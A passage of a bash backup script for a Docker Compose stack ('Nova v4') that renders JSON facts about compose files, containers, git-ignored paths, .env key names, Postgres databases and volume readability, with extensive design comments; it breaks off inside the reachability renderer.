#!/usr/bin/env bash
# Nova v4 backup: the part that DECIDES, VERIFIES and REFUSES.
#
# This script is the only thing in the backup path that holds `docker`, reads
# the host or writes `.env`. It reads no byte of Nova's data and holds no key:
# it renders every fact it needs into $STAGE/facts/*.json and hands those
# files to a throwaway container of the already-built core image, which has no
# docker socket. That split is what lets the whole suite run with `docker`,
# `git` and `psql` stubbed and no live stack — and what keeps a mounted socket
# (root on the host) out of the design entirely.
#
# bash 3.2 compatible, Linux and macOS, GNU and BSD userland: no associative
# arrays, no ${var,,}, no mapfile, no process substitution, no `sed -i`, no
# GNU-only date/stat/readlink. See docs/plans/rebuild/s41/map-portability.md.
#
# Entry-guarded like deploy/install.sh:1139-1141, so deploy/backup_test.sh can
# source it and drive the real shipped functions with the seams stubbed.
#
# Four verbs live here: `cmd_backup` (design-verdict §9.1), `cmd_restore`
# — which is also `restore --drill` (§9.2, §9.3) — `cmd_drill` (§9.4) and
# `cmd_undo_move` (§9.5), above the fact renderers they all share. All four
# are dispatched by `./install <verb>`, which sources this file and nothing
# else.

BK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
BK_REPO_ROOT="$(cd "$BK_DIR/.." && pwd)"

# shellcheck source=/dev/null
. "$BK_DIR/compose_read.sh"
# And the passphrase resolver seam, because every verb below calls
# `resolve_passphrase`. Sourced HERE and not left to the caller: as of
# `705620ee` deploy/install.sh dispatches `backup`, `restore` and `drill` by
# sourcing THIS file and nothing else, so `./install backup` died with
# `resolve_passphrase: command not found` before it read a byte. A file that
# calls a function declares where the function comes from; sourcing it twice
# costs a function redefinition and nothing else.
# shellcheck source=/dev/null
. "$BK_DIR/passphrase.sh"

# ── the seams the suite stubs ───────────────────────────────────────────────
#
# Everything below reaches the outside world through exactly these names, so a
# test replaces a shell function and never a binary.

bk_docker() { docker "$@"; }
bk_git() { git "$@"; }

# ── small helpers ───────────────────────────────────────────────────────────

# A stated refusal, house prefix, on stderr. Never a warning, never a default.
bk_fail() {
  printf 'Error: %s\n' "$1" >&2
  return 1
}

# One TAB-separated column of $1, by position, counting from 1.
#
# NEVER `IFS=$'\t' read -r a b c …`. TAB is IFS *whitespace*: a run of tabs
# collapses into ONE delimiter, so every field after an empty one shifts
# left. `cfg_mounts` emits six fields and leaves `disposition` and `reason`
# empty for every un-annotated mount, and a short-form anonymous volume
# (`- /var/cache/foo`) renders as `type: volume` with no `source` at all — so
# the row that shifts is an ordinary one, not an exotic one. This was already
# fixed once, for the coverage rows, by moving them to US separators; it came
# back here, in the derivation of step 7's writer set, which is the list the
# EXIT trap restarts. `cut -f` counts delimiters instead of words.
bk_col() { printf '%s' "$1" | cut -f"$2"; }

# The env file a real install writes. Overridable so the suite never reads the
# operator's own.
bk_env_file() { printf '%s\n' "${BK_ENV_FILE:-$BK_DIR/.env}"; }
bk_env_example() { printf '%s\n' "${BK_ENV_EXAMPLE:-$BK_DIR/.env.example}"; }

# The compose files this run is about, one per line, absolute.
#
# Read from COMPOSE_FILE in deploy/.env — the line record_compose_files writes
# with absolute paths (deploy/install.sh:956-966) — because that is the list a
# bare `docker compose` on this host actually merges, GPU overlay included. A
# bare `-f deploy/docker-compose.yml` silently drops the overlay, which is the
# 2026-09-04 incident deploy/docker-compose.gpu.yml:14-21 describes.
bk_compose_files() {
  local from_env=""
  if [ -n "${BK_COMPOSE_FILES:-}" ]; then
    printf '%s\n' "$BK_COMPOSE_FILES" | tr ':' '\n' | sed '/^$/d'
    return 0
  fi
  if [ -f "$(bk_env_file)" ]; then
    from_env="$(grep -m1 '^COMPOSE_FILE=' "$(bk_env_file)" | cut -d'=' -f2-)" || from_env=""
  fi
  if [ -n "$from_env" ]; then
    printf '%s\n' "$from_env" | tr ':' '\n' | sed '/^$/d'
    return 0
  fi
  printf '%s\n' "$BK_DIR/docker-compose.yml"
}

# BK_COMPOSE_ARGS[] — the -f flags plus --project-directory, in file order.
# bash 3.2 has no way to return an array, so this sets a global, the way
# install.sh's COMPOSE_ARGS already works.
bk_set_compose_args() {
  local f
  BK_COMPOSE_ARGS=(--project-directory "$BK_DIR")
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    BK_COMPOSE_ARGS+=(-f "$f")
  done <<EOF
$(bk_compose_files)
EOF
}

# EVERY profile, always. A profile-gated service that is switched off still
# owns its volume, and a volume nothing renders is a volume nothing can
# classify. stderr is CAPTURED, not discarded: compose_config_text
# (deploy/install.sh:394-396) throws it away with 2>/dev/null, and a renderer
# that cannot say WHY it failed is the failure this slice refuses to ship.
bk_compose_config() {
  bk_set_compose_args
  bk_docker compose "${BK_COMPOSE_ARGS[@]}" --profile '*' config "$@"
}

# JSON that a host python3 can confirm parses. When there is no python3 the
# check is NOT skipped: it moves to load_facts() inside the pack container,
# which reports R0_FACT_UNREADABLE naming the file and refuses the run. Either
# way an unparseable fact stops the backup; this is only about which side of
# the boundary says so first.
bk_json_parses() {
  command -v python3 >/dev/null 2>&1 || return 0
  python3 -c 'import json,sys; json.load(open(sys.argv[1]))' "$1" >/dev/null 2>&1
}

# A non-empty file that parses, or a refusal naming the command and its stderr.
bk_verify_fact() {
  local path="$1" cmd="$2" errfile="$3"
  if [ ! -s "$path" ]; then
    bk_fail "$cmd produced nothing. An empty fact is a reading that failed, not a
       stack with nothing in it.
       stderr: $(tr '\n' ' ' < "$errfile" 2>/dev/null)"
    return 1
  fi
  case "$path" in
    *.json)
      if ! bk_json_parses "$path"; then
        bk_fail "$cmd produced output that is not JSON ($path).
       stderr: $(tr '\n' ' ' < "$errfile" 2>/dev/null)"
        return 1
      fi
      ;;
  esac
  return 0
}

# JSON-escape one value (the reasons and paths that reach these files are
# prose and host paths, so quotes and backslashes are ordinary).
bk_j() { _cr_j "$1"; }

# The project label every `docker` selection below is filtered by. Read from
# the render — never typed, never assembled.
#
# TWO functions, and the split is the whole point. `bk_set_project` assigns
# BK_PROJECT in the CALLER'S shell; `bk_project` prints it. Every caller here
# is `project="$(bk_project)"`, and `$( … )` is a subshell — so a cache the
# function sets for itself is discarded the moment it returns, every time.
# That was shipped last round and reported as having removed two renders. It
# removed none: MEASURED at 5 `docker compose … config` invocations per
# render_facts run with the cache and 5 without.
#
# render_facts primes it once, in its own shell, and the substitutions below
# then INHERIT the value. Called standalone (refresh.sh, a single renderer in
# a test) nothing primes it and each call reads the render once, which is
# correct and merely uncached.
#
# stderr is CARRIED, not discarded. `bk_compose_config 2>/dev/null | …` is the
# exact pattern this file's own header condemns at install.sh:394-396: every
# caller below refuses when the project name is empty, and without the reason
# compose gave, the refusal says "no project name" when the truth was "your
# .env names a compose file that is not there".
bk_set_project() {
  local stage="${1:-}" err rc=0 text
  # When the YAML render is already on disk, read it: the project name is in
  # that text and running compose again to re-learn it is a whole render for
  # a line we have.
  if [ -n "$stage" ] && [ -s "$stage/facts/config.yaml" ]; then
    BK_PROJECT="$(cfg_project_name < "$stage/facts/config.yaml")"
    if [ -z "$BK_PROJECT" ]; then
      bk_fail "$stage/facts/config.yaml carries no top-level \`name:\` line, so this stack
       has no project label for anything below to select by."
      return 1
    fi
    return 0
  fi
  err="$(mktemp "${TMPDIR:-/tmp}/nova-project.XXXXXX")" || return 1
  text="$(bk_compose_config 2> "$err")" || rc=$?
  if [ "$rc" -ne 0 ]; then
    bk_fail "docker compose --profile '*' config exited $rc while reading the project name.
       stderr: $(tr '\n' ' ' < "$err")"
    rm -f "$err"
    return 1
  fi
  BK_PROJECT="$(printf '%s' "$text" | cfg_project_name)"
  if [ -z "$BK_PROJECT" ]; then
    bk_fail "the compose render carries no top-level \`name:\` line, so this stack has no
       project label for anything below to select by.
       stderr: $(tr '\n' ' ' < "$err")"
    rm -f "$err"
    return 1
  fi
  rm -f "$err"
}

bk_project() {
  [ -n "${BK_PROJECT:-}" ] || bk_set_project || return 1
  printf '%s\n' "$BK_PROJECT"
}

# The image the reachability probe runs. Read off the RUNNING postgres
# container's own image id, so nothing here names an image: a probe that
# pulled its own image would be measuring a different machine's postgres.
bk_probe_image() {
  local project id image
  project="$(bk_project)" || return 1
  id="$(bk_docker ps -a \
    --filter "label=com.docker.compose.project=$project" \
    --filter "label=com.docker.compose.service=postgres" \
    --format '{{.ID}}' 2>/dev/null | head -1)"
  if [ -z "$id" ]; then
    bk_fail "no container of this project carries the label
       com.docker.compose.service=postgres, so there is no image to run the
       reachability probe with. The probe image is READ off the running
       postgres container, never typed."
    return 1
  fi
  image="$(bk_docker inspect "$id" --format '{{.Image}}' 2>/dev/null)"
  if [ -z "$image" ]; then
    bk_fail "docker inspect could not report the image of container $id."
    return 1
  fi
  printf '%s\n' "$image"
}

# ── the fact renderers (design-verdict.md §6.1) ─────────────────────────────
#
# Each one checks its own exit status AND that its output is there, captures
# stderr and carries it into the refusal. An empty-but-successful fact is a
# failure, not "nothing to carry".
#
# Six of these are §6.1's table. `render_env` and `render_databases` are not
# in that table and §6.3 needs both — step 7 classifies every key in the live
# .env and step 8's R7 refuses an empty database list — and neither can come
# from the census, which §9.1 runs five steps AFTER coverage. Without them
# coverage would silently drop two of its eight refusal codes.

# facts/compose/ — THE RAW TEXT of every file in COMPOSE_FILE, staged byte
# for byte, plus a manifest naming where each came from.
#
# Nothing here parses YAML. novabundle.py does, with PyYAML, in the container
# it already runs in (s41/rulings.md 2026-09-21): four fix rounds found six
# real binds the hand-written awk reader did not see, each in a different
# place, and a mechanism whose whole purpose is to refuse rather than skip
# cannot rest on a parser that silently skips what its author did not think
# of. What does NOT change is the SOURCE: the declared set still comes from
# this raw text, never from a render, because compose prunes a volume no
# rendered service mounts out of `config`, `config --format json` and
# `config --volumes` alike (measured on v5.3.0 and v5.5.1) — and a declared
# volume nothing mounts is the exact case coverage exists to catch.
render_raw() {
  local stage="$1"
  local dir="$stage/facts/compose" files f staged idx first

  files="$(bk_compose_files)"
  if [ -z "$files" ]; then
    bk_fail "COMPOSE_FILE names no compose file, so there is no declared set to read."
    return 1
  fi

  rm -rf "$dir" || return 1
  if ! mkdir -p "$dir"; then
    bk_fail "could not create $dir to stage the compose text in."
    return 1
  fi

  # Copied first, manifest second: a file this host cannot read stops the run
  # before anything downstream has a half-written manifest to believe.
  idx=0
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    if [ ! -r "$f" ]; then
      bk_fail "COMPOSE_FILE names $f and this host cannot read it."
      return 1
    fi
    staged="$(printf '%03d.yml' "$idx")"
    if ! cat "$f" > "$dir/$staged"; then
      bk_fail "could not stage $f into $dir/$staged."
      return 1
    fi
    if [ ! -s "$dir/$staged" ]; then
      bk_fail "$f is empty. An empty compose file is a reading that failed, not a
       stack with nothing in it."
      return 1
    fi
    idx=$((idx + 1))
  done <<EOF
$files
EOF

  idx=0
  first=1
  {
    printf '{\n  "compose_files": ['
    while IFS= read -r f; do
      [ -n "$f" ] || continue
      [ "$first" -eq 1 ] || printf ','
      first=0
      printf '\n    {"source": "%s", "staged": "%03d.yml"}' "$(bk_j "$f")" "$idx"
      idx=$((idx + 1))
    done <<EOF
$files
EOF
    printf '\n  ]\n}\n'
  } > "$dir/files.json"

  bk_verify_fact "$dir/files.json" "staging the raw text of COMPOSE_FILE" /dev/null
}

# config.yaml + dispositions.json — THE DISPOSITIONS, and only from here.
# `config --format json` keeps only a TOP-LEVEL `x-` key and strips every
# nested one (a volume's, a service's, a long-syntax mount's), and every
# disposition is nested. dispositions.json is what crosses into the container,
# already reduced to JSON.
render_dispositions() {
  local stage="$1"
  local yaml="$stage/facts/config.yaml" out="$stage/facts/dispositions.json"
  local err="$stage/facts/.config-yaml.err" rc=0
  bk_compose_config > "$yaml" 2> "$err" || rc=$?
  if [ "$rc" -ne 0 ]; then
    bk_fail "docker compose --profile '*' config exited $rc.
       stderr: $(tr '\n' ' ' < "$err")"
    return 1
  fi
  bk_verify_fact "$yaml" "docker compose --profile '*' config" "$err" || return 1
  dispositions_json < "$yaml" > "$out"
  bk_verify_fact "$out" "reading dispositions out of the YAML render" "$err"
}

# config.json — resolved mount structure, resolved absolute bind sources,
# read_only, service environment, depends_on and the project name. Warnings go
# to stderr; only stdout is parsed.
render_config() {
  local stage="$1"
  local out="$stage/facts/config.json" err="$stage/facts/.config-json.err" rc=0
  bk_compose_config --format json > "$out" 2> "$err" || rc=$?
  if [ "$rc" -ne 0 ]; then
    bk_fail "docker compose --profile '*' config --format json exited $rc.
       stderr: $(tr '\n' ' ' < "$err")"
    return 1
  fi
  bk_verify_fact "$out" "docker compose --profile '*' config --format json" "$err"
}

# containers.json — the anonymous and image-declared volumes compose never
# names, read from docker itself. Exited containers INCLUDED: a container that
# is not running still pins the volume it mounts. Selection is by the
# com.docker.compose.project LABEL, never by a name prefix.
render_containers() {
  local stage="$1"
  local out="$stage/facts/containers.json" err="$stage/facts/.containers.err"
  local project id first rc=0 ids
  project="$(bk_project)" || return 1
  ids="$(bk_docker ps -a --filter "label=com.docker.compose.project=$project" \
    --format '{{.ID}}' 2> "$err")" || rc=$?
  if [ "$rc" -ne 0 ]; then
    bk_fail "docker ps -a --filter label=com.docker.compose.project=$project exited $rc.
       stderr: $(tr '\n' ' ' < "$err")"
    return 1
  fi
  {
    printf '{\n  "project": "%s",\n  "containers": [' "$(bk_j "$project")"
    first=1
    while IFS= read -r id; do
      [ -n "$id" ] || continue
      [ "$first" -eq 1 ] || printf ','
      first=0
      printf '\n    '
      bk_docker inspect "$id" --format '{"id": {{json .Id}}, "name": {{json (index (split .Name "/") 1)}}, "service": {{json (index .Config.Labels "com.docker.compose.service")}}, "state": {{json .State.Status}}, "config_files": {{json (index .Config.Labels "com.docker.compose.project.config_files")}}, "mounts": {{json .Mounts}}}' 2>> "$err" || rc=$?
    done <<EOF
$ids
EOF
    printf '\n  ]\n}\n'
  } > "$out"
  if [ "$rc" -ne 0 ]; then
    bk_fail "docker inspect could not report a container's mounts (exit $rc).
       stderr: $(tr '\n' ' ' < "$err")"
    return 1
  fi
  bk_verify_fact "$out" "docker ps -a + docker inspect for .Mounts" "$err"
}

# git.json — what the host tree under each scan root is: code that comes back
# from the remote, or state with no other copy.
#
# Scan roots are DERIVED: the directory of each compose file, plus every
# resolved bind source. Not dirname(bind), which resolves to the repo root and
# drags in all of v3's tree.
#
# THE TRAILING SLASH IS NOT OPTIONAL. Measured in this checkout:
#   git check-ignore -v data   -> exit 1 (NOT ignored)
#   git check-ignore -v data/  -> .gitignore:13:data/
# and `../data` is a real bind (deploy/docker-compose.yml). A renderer that
# probes a directory without the slash calls it `unknown`, which is R2, which
# means every v4 backup refuses on day one.
render_git() {
  local stage="$1"
  local out="$stage/facts/git.json" err="$stage/facts/.git.err"
  local root inside rc=0 r rel first

  inside="$(bk_git rev-parse --is-inside-work-tree 2> "$err")" || rc=$?
  if [ "$rc" -ne 0 ] || [ "$inside" != "true" ]; then
    bk_fail "$BK_REPO_ROOT is not a git work tree, so nothing can say which host
       files are code that comes back from the remote and which are state with
       no other copy. This is a different failure from git being unavailable.
       stderr: $(tr '\n' ' ' < "$err")"
    return 1
  fi
  root="$(bk_git rev-parse --show-toplevel 2>> "$err")" || rc=$?
  if [ "$rc" -ne 0 ] || [ -z "$root" ]; then
    bk_fail "git could not be asked for the work tree root.
       stderr: $(tr '\n' ' ' < "$err")"
    return 1
  fi

  BK_GIT_ROOT="$root"
  BK_BIND_SOURCES="$(bk_bind_sources "$stage")"
  BK_WALK_FILES=""
  BK_WALK_IGNORED_DIRS=""

  # Walk first, classify second, emit third: a `git` that cannot answer must
  # fail the renderer, and a failure discovered half way through writing the
  # file would leave a truncated fact behind.
  while IFS= read -r r; do
    [ -n "$r" ] || continue
    bk_list_has "$BK_BIND_SOURCES" "$r" && continue
    bk_git_walk "$r"
  done <<EOF
$(bk_scan_roots "$stage")
EOF
  bk_git_classify || return 1

  {
    printf '{\n  "work_tree": true,\n  "root": "%s",\n  "scan_roots": [' "$(bk_j "$root")"
    first=1
    while IFS= read -r r; do
      [ -n "$r" ] || continue
      [ "$first" -eq 1 ] || printf ','
      first=0
      printf '\n    "%s"' "$(bk_j "$r")"
    done <<EOF
$(bk_scan_roots "$stage")
EOF
    printf '\n  ],\n  "roots": {'
    # Each scan root probed AS A DIRECTORY, trailing slash first. Recorded
    # separately from `paths` because a bind source is classified by its own
    # x-nova-backup row, not by git — this is the evidence, not a decision.
    first=1
    while IFS= read -r r; do
      [ -n "$r" ] || continue
      rel="$(bk_relpath "$r" "$root")"
      [ "$first" -eq 1 ] || printf ','
      first=0
      printf '\n    "%s": "%s"' "$(bk_j "$rel")" "$(bk_git_dir_status "$rel")"
    done <<EOF
$(bk_scan_roots "$stage")
EOF
    printf '\n  },\n  "paths": {'
    bk_git_emit_paths
    printf '\n  }\n}\n'
  } > "$out"
  bk_verify_fact "$out" "git check-ignore / git ls-files under each scan root" "$err"
}

# The scan roots, derived — never a list. {dirname of each compose file} plus
# {every resolved bind source}.
bk_scan_roots() {
  local stage="$1" f
  {
    while IFS= read -r f; do
      [ -n "$f" ] || continue
      printf '%s\n' "$(cd "$(dirname "$f")" && pwd -P)"
    done <<EOF
$(bk_compose_files)
EOF
    bk_bind_sources "$stage"
  } | sort -u
}

# Every resolved bind source in the render, absolute, one per line.
bk_bind_sources() {
  local stage="$1" svc
  [ -f "$stage/facts/config.yaml" ] || return 0
  for svc in $(cfg_service_keys < "$stage/facts/config.yaml"); do
    cfg_mounts "$svc" < "$stage/facts/config.yaml" |
      awk -F'\t' '$1 == "bind" && $2 != "" { print $2 }'
  done | sort -u
}

# $1 relative to $2, without readlink -f (not portable) — the same
# cd-and-pwd-P shape canonical_path uses at deploy/install.sh:132-146.
bk_relpath() {
  local path="$1" base="$2"
  case "$path" in
    "$base") printf '.' ;;
    "$base"/*) printf '%s' "${path#"$base"/}" ;;
    *) printf '%s' "$path" ;;
  esac
}

# "ignored" | "tracked" | "unknown" for a DIRECTORY, probed with the trailing
# slash FIRST. Nothing else in this file may probe a directory.
bk_git_dir_status() {
  local rel="$1"
  if bk_git check-ignore -q "$rel/" 2>/dev/null; then
    printf 'ignored'
    return 0
  fi
  if bk_git ls-files --error-unmatch "$rel" >/dev/null 2>&1; then
    printf 'tracked'
    return 0
  fi
  printf 'unknown'
}

# One directory of the walk. An ignored directory is recorded and NOT
# descended (its contents share its answer); a bind source is skipped
# entirely, because its own x-nova-backup row classifies it.
bk_git_walk() {
  local dir="$1" p rel
  bk_list_has "$BK_BIND_SOURCES" "$dir" && return 0
  for p in "$dir"/* "$dir"/.[!.]* "$dir"/..?*; do
    [ -e "$p" ] || continue
    bk_list_has "$BK_BIND_SOURCES" "$p" && continue
    rel="$(bk_relpath "$p" "$BK_GIT_ROOT")"
    if [ -d "$p" ]; then
      if [ "$(bk_git_dir_status "$rel")" = "ignored" ]; then
        BK_WALK_IGNORED_DIRS="$BK_WALK_IGNORED_DIRS
$rel"
        continue
      fi
      bk_git_walk "$p"
    else
      BK_WALK_FILES="$BK_WALK_FILES
$rel"
    fi
  done
}

# The walked set, classified in two batched passes rather than two forks per
# file: one `git check-ignore --stdin`, one `git ls-files`. Anything in
# neither answer is "unknown", which coverage turns into R2 — never into an
# include, and never into a silent skip.
#
# `check-ignore` exits 1 when NO path matched, which is an answer and not a
# failure (the same distinction deploy/install.sh:869-877 draws for grep);
# 128 is a real error and fails the renderer.
bk_git_classify() {
  local rc=0 args rel
  BK_GIT_FILES="$(printf '%s\n' "$BK_WALK_FILES" | sed '/^$/d' | sort -u)"
  BK_GIT_IGNORED=""
  BK_GIT_TRACKED=""
  [ -n "$BK_GIT_FILES" ] || return 0

  BK_GIT_IGNORED="$(printf '%s\n' "$BK_GIT_FILES" | bk_git check-ignore --stdin)" || rc=$?
  if [ "$rc" -gt 1 ]; then
    bk_fail "git check-ignore --stdin exited $rc under $BK_GIT_ROOT."
    return 1
  fi

  args=()
  while IFS= read -r rel; do
    [ -n "$rel" ] || continue
    args+=("$rel")
  done <<EOF
$BK_GIT_FILES
EOF
  rc=0
  BK_GIT_TRACKED="$(bk_git ls-files -- "${args[@]}")" || rc=$?
  if [ "$rc" -ne 0 ]; then
    bk_fail "git ls-files exited $rc under $BK_GIT_ROOT."
    return 1
  fi
  return 0
}

bk_git_emit_paths() {
  local files ignored tracked rel first=1
  files="$BK_GIT_FILES"
  ignored="$BK_GIT_IGNORED"
  tracked="$BK_GIT_TRACKED"
  while IFS= read -r rel; do
    [ -n "$rel" ] || continue
    [ "$first" -eq 1 ] || printf ','
    first=0
    printf '\n    "%s": "ignored"' "$(bk_j "$rel")"
  done <<EOF
$(printf '%s\n' "$BK_WALK_IGNORED_DIRS" | sed '/^$/d' | sort -u)
EOF
  while IFS= read -r rel; do
    [ -n "$rel" ] || continue
    [ "$first" -eq 1 ] || printf ','
    first=0
    if bk_list_has "$ignored" "$rel"; then
      printf '\n    "%s": "ignored"' "$(bk_j "$rel")"
    elif bk_list_has "$tracked" "$rel"; then
      printf '\n    "%s": "tracked"' "$(bk_j "$rel")"
    else
      printf '\n    "%s": "unknown"' "$(bk_j "$rel")"
    fi
  done <<EOF
$files
EOF
}

bk_list_has() {
  case "
$1
" in
    *"
$2
"*) return 0 ;;
  esac
  return 1
}

# env.json — the KEY NAMES in the live .env and the declarations above them in
# .env.example. NEVER a value: this file is staged on disk and its whole job
# is to let something else decide what travels.
render_env() {
  local stage="$1"
  local out="$stage/facts/env.json" env_file example line key pending first
  env_file="$(bk_env_file)"
  example="$(bk_env_example)"
  if [ ! -f "$env_file" ]; then
    bk_fail "$env_file does not exist. It holds every generated secret and it is the
       one file nothing can regenerate, so an absent .env is a stack that was
       never installed here — not a stack with no secrets."
    return 1
  fi
  if [ ! -r "$example" ]; then
    bk_fail "$example is not readable, so no .env key has a declaration and every
       one of them would refuse."
    return 1
  fi
  {
    printf '{\n  "env_file": "%s",\n  "keys": [' "$(bk_j "$env_file")"
    first=1
    while IFS= read -r line || [ -n "$line" ]; do
      case "$line" in
        [A-Za-z_]*=*) ;;
        *) continue ;;
      esac
      key="${line%%=*}"
      [ "$first" -eq 1 ] || printf ','
      first=0
      printf '\n    "%s"' "$(bk_j "$key")"
    done < "$env_file"
    [ "$first" -eq 1 ] || printf '\n  '
    printf '],\n  "declarations": {'
    # `# nova-backup: <disposition>` on the line IMMEDIATELY above the key.
    # A commented-out key counts: COMPOSE_FILE and INSTANCE_SECRET are written
    # into every real .env by something other than this file, so their
    # declarations can only live on a commented-out line.
    first=1
    pending=""
    while IFS= read -r line || [ -n "$line" ]; do
      case "$line" in
        "# nova-backup:"*)
          pending="$(printf '%s' "${line#\# nova-backup:}" | awk '{print $1}')"
          continue
          ;;
        [A-Za-z_]*=*) key="${line%%=*}" ;;
        "#"[\ ]*=*) key="" ;;
        *) pending=""; continue ;;
      esac
      if [ -z "$key" ]; then
        key="$(printf '%s' "$line" | sed -n 's/^# *\([A-Za-z_][A-Za-z0-9_]*\)=.*$/\1/p')"
      fi
      [ -n "$key" ] || { pending=""; continue; }
      if [ -n "$pending" ]; then
        [ "$first" -eq 1 ] || printf ','
        first=0
        printf '\n    "%s": "%s"' "$(bk_j "$key")" "$(bk_j "$pending")"
      fi
      pending=""
    done < "$example"
    [ "$first" -eq 1 ] || printf '\n  '
    printf '}\n}\n'
  } > "$out"
  bk_verify_fact "$out" "reading key NAMES from $env_file and declarations from $example" /dev/null
}

# databases.json — every database on the server. There is no per-database
# disposition anywhere in this design, so a database a later slice adds is
# carried the day it exists; an EMPTY list is R7, because Nova's state is
# three databases and zero is a reading that failed.
render_databases() {
  local stage="$1"
  local out="$stage/facts/databases.json" err="$stage/facts/.databases.err"
  local project id rows rc=0 line first
  project="$(bk_project)" || return 1
  id="$(bk_docker ps --filter "label=com.docker.compose.project=$project" \
    --filter "label=com.docker.compose.service=postgres" \
    --format '{{.ID}}' 2> "$err" | head -1)"
  if [ -z "$id" ]; then
    bk_fail "no RUNNING container of this project carries the label
       com.docker.compose.service=postgres, so the database list cannot be read.
       stderr: $(tr '\n' ' ' < "$err")"
    return 1
  fi
  rows="$(bk_docker exec "$id" psql -U postgres -At -F'|' -c \
    "SELECT datname, pg_catalog.pg_get_userbyid(datdba) FROM pg_database WHERE datallowconn AND datname NOT IN ('postgres','template0','template1') ORDER BY 1" \
    2>> "$err")" || rc=$?
  if [ "$rc" -ne 0 ]; then
    bk_fail "reading the database list from container $id exited $rc.
       stderr: $(tr '\n' ' ' < "$err")"
    return 1
  fi
  {
    printf '{\n  "databases": ['
    first=1
    while IFS= read -r line; do
      [ -n "$line" ] || continue
      [ "$first" -eq 1 ] || printf ','
      first=0
      printf '\n    {"name": "%s", "owner": "%s"}' \
        "$(bk_j "${line%%|*}")" "$(bk_j "${line#*|}")"
    done <<EOF
$rows
EOF
    [ "$first" -eq 1 ] || printf '\n  '
    printf ']\n}\n'
  } > "$out"
  bk_verify_fact "$out" "psql -c 'SELECT datname FROM pg_database ...'" "$err"
}

# reachable.json — can this host actually READ each thing that is to be
# carried as bytes?
#
# Two readings per volume, not one: `docker volume inspect` says whether it
# EXISTS (R5), and only then a probe container says whether it can be read
# (R6). The order matters because `docker run -v <name>:/probe` CREATES a
# missing volume, so the probe alone can never tell the two apart.
#
# Mounted at /probe — a path no image populates, so a non-empty answer is the
# volume's own content and not the image's. The EXIT STATUS is read, never the
# emptiness of stdout: a probe that failed and a volume that is empty are
# different facts.
# One volume, two readings, emitted as one JSON member: "<key>": {...}.
# `docker volume inspect` FIRST, because `docker run -v <name>:/probe` CREATES
# a missing volume and the probe alone can then never tell R5 from R6.
bk_probe_volume() {
  local key="$1" full="$2" image="$3" err="$4" rc=0
  bk_docker volume inspect "$full" >/dev/null 2>> "$err" || rc=$?
  if [ "$rc" -ne 0 ]; then
    printf '\n    "%s": {"exists": false, "ok": false, "detail": "%s"}' \
      "$(bk_j "$key")" "$(bk_j "docker volume inspect $full exited $rc")"
    return 0
  fi
  rc=0
  bk_docker run --rm -v "$full:/probe:ro" --entrypoint find "$image" \
    /probe -mindepth 1 -maxdepth 1 -print -quit >/dev/null 2>> "$err" || rc=$?
  if [ "$rc" -ne 0 ]; then
    printf '\n    "%s": {"exists": true, "ok": false, "detail": "%s"}' \
      "$(bk_j "$key")" \
      "$(bk_j "\`docker run --rm -v $full:/probe:ro $image find /probe …\` exited $rc")"
  else
    printf '\n    "%s": {"exists": true, "ok": true, "detail": ""}' "$(bk_j "$key")"
  fi
}

# One host path, as the INVOKING USER sees it — not as a container would. The
# bundle is read back by the operator, so the operator's own readability is
# the fact that matters.
bk_probe_path() {
  local key="$1" path="$2"
  if [ -r "$path" ]; then
    printf '\n    "%s": {"exists": true, "ok": true, "detail": ""}' "$(bk_j "$key")"
  elif [ -e "$path" ]; then
    printf '\n    "%s": {"exists": true, "ok": false, "detail": "not readable by this user"}' \
      "$(bk_j "$key")"
  else
    printf '\n    "%s": {"exists": false, "ok": false, "detail": "no such path"}' "$(bk_j "$key")"
  fi
}

# "<service>\t<destination>\t<64-hex name>" for every ANONYMOUS volume mount
# in containers.json. An image-declared volume has no compose key — that is
# what makes it anonymous — so the only thing a probe can address it by is the
# name docker gave it, and the only place that name exists is this fact.
#
# containers.json puts one container per line by construction (render_containers
# above), and docker's own `{{json .Mounts}}` emits each mount object with its
# keys in alphabetical order and no spaces, so `},{` separates them.
bk_anon_mounts() {
  local stage="$1"
  [ -f "$stage/facts/containers.json" ] || return 0
  awk '
    # Tolerant of the space after a colon: docker emits `{{json .Mounts}}`
    # compact, and anything that re-serialises the fact may not.
    function field(chunk, key,   p, v) {
      p = match(chunk, "\"" key "\"[ ]*:[ ]*\"")
      if (p == 0) return ""
      v = substr(chunk, p + RLENGTH)
      sub(/".*$/, "", v)
      return v
    }
    /"mounts"/ {
      svc = field($0, "service")
      n = split($0, chunk, /\}[ ]*,[ ]*\{/)
      for (i = 1; i <= n; i++) {
        if (field(chunk[i], "Type") != "volume") continue
        name = field(chunk[i], "Name")
        if (length(name) != 64 || name !~ /^[0-9a-f]+$/) continue
        print svc "\t" field(chunk[i], "Destination") "\t" name
      }
    }
  ' "$stage/facts/containers.json"
}

render_reachable() {
  local stage="$1"
  local mode="${2:-routine}" out="$stage/facts/reachable.json"
  local err="$stage/facts/.reachable.err" image key disp full first rc line root
  local svc src _tgt _ro _reason anon_svc anon_dest anon_name

  if [ ! -f "$stage/facts/config.yaml" ] || [ ! -f "$stage/facts/git.json" ]; then
    bk_fail "reachable.json is rendered from the dispositions and the git scan, and
       one of them is not there yet."
    return 1
  fi
  # Read back out of the rendered fact, so this renderer needs nothing the
  # previous one left in a variable.
  root="$(sed -n 's/^  "root": "\(.*\)",$/\1/p' "$stage/facts/git.json" | head -1)"
  if [ -z "$root" ]; then
    bk_fail "git.json records no work-tree root, so no host path can be probed."
    return 1
  fi
  image="$(bk_probe_image)" || return 1

  {
    printf '{\n  "probe_image": "%s",\n  "volumes": {' "$(bk_j "$image")"
    first=1
    for key in $(cfg_volume_keys < "$stage/facts/config.yaml"); do
      disp="$(cfg_volume_disposition "$key" < "$stage/facts/config.yaml" | cut -f1)"
      case "$disp" in
        include) ;;
        move-only) [ "$mode" = "move" ] || continue ;;
        *) continue ;;
      esac
      full="$(cfg_volume_name "$key" < "$stage/facts/config.yaml")"
      [ "$first" -eq 1 ] || printf ','
      first=0
      bk_probe_volume "$key" "$full" "$image" "$err"
    done
    # Anonymous volumes an image declares, keyed by the 64-hex name docker
    # gave them. Without this an anon row declared `include` is carried with
    # nothing having proved it readable — coverage refuses R6 on the absence,
    # which is safe, but it would refuse for ever.
    while IFS= read -r line; do
      anon_svc="$(bk_col "$line" 1)"
      anon_dest="$(bk_col "$line" 2)"
      anon_name="$(bk_col "$line" 3)"
      [ -n "$anon_name" ] || continue
